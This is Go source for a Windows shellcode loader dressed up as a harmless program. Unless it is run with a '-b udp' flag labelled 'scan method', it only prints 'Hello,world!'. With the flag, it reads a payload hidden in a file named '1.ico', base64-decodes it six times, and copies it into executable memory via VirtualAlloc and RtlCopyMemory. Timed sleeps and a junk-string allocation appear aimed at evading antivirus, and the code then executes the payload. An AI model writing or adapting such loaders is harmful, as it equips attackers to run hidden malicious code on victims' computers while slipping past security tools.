package main

import (
  "encoding/base64"
  //"encoding/hex"
  "flag"
  "fmt"
  "io/ioutil"
  "os"
  "syscall"
  "time"
  "unsafe"
  "runtime"
)

const (
  MEM_COMMIT             = 0x1000
  MEM_RESERVE            = 0x2000
  PAGE_EXECUTE_READWRITE = 0x40
)

var (
  ke  = syscall.MustLoadDLL("kernel32.dll")
  nt  = syscall.MustLoadDLL("ntdll.dll")
  vac = ke.MustFindProc("VirtualAlloc")
  rt  = nt.MustFindProc("RtlCopyMemory")
)

func checkErr(err error) {
  if err != nil {
    if err.Error() != "The operation completed successfully." {
      println(err.Error())
      os.Exit(1)
    }
  }
}

func ReadSC() string {
  f, err := ioutil.ReadFile("1.ico")
  if err != nil {
    fmt.Println("read fail", err)
  }
  return string(f)
}

var ms string

func main() {
  ms1 := flag.String("b", "tcp", "scan method")
  flag.Parse()
  //fmt.Println(*ms1)
  ms = *ms1
  arch := runtime.GOARCH
  if ms == "udp" && arch == "amd64"{
	
	oss := runtime.GOOS
	fmt.Println(arch)
	fmt.Println(oss)
    var c string = "qweqwdsfqweqwqwswqqweqdqwdqwdwqeqrwqeqwQWRQW/.OPKDIJGIJWDOIAOSJIRGJOEKDOQIWOIJOGWEMPOSDPOOPGKWE[LWEPQKPOKEORKOPKPROKPOKOPQWKEPQOGOIMEKOMDMQWPODPOKOK3-021-04-34-3204O-02I059032JR0JI@JI3J3E02e"
    addr1, _, err := vac.Call(0, uintptr(len(c)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    _, _, err = rt.Call(addr1, (uintptr)(unsafe.Pointer(&c)), uintptr(len(c)/2))
    time.Sleep(time.Second * 3)
    var b string = ReadSC()
    
	desc, _ := base64.StdEncoding.DecodeString(string(b))
	
	for i := 0; i < 5; i++ {
		desc, _  = base64.StdEncoding.DecodeString(string(desc))
	}
	//fmt.Println(desc)
	//desc, _ = hex.DecodeString(string(desc))
  
	sc := desc
    time.Sleep(time.Second * 3)
    addr, _, err := vac.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    time.Sleep(time.Second * 1)
    if addr == 0 {
      checkErr(err)
    }
    _, _, err = rt.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)/2))
    time.Sleep(time.Second * 2)
    _, _, err = rt.Call(addr+uintptr(len(sc)/2), (uintptr)(unsafe.Pointer(&sc[len(sc)/2])), uintptr(len(sc)/2))
    time.Sleep(time.Second * 2)
    checkErr(err)
    time.Sleep(time.Second * 3)
    syscall.Syscall(addr, 0, 0, 0, 0)
  } else {
    fmt.Println("Hello,world!")
  }



}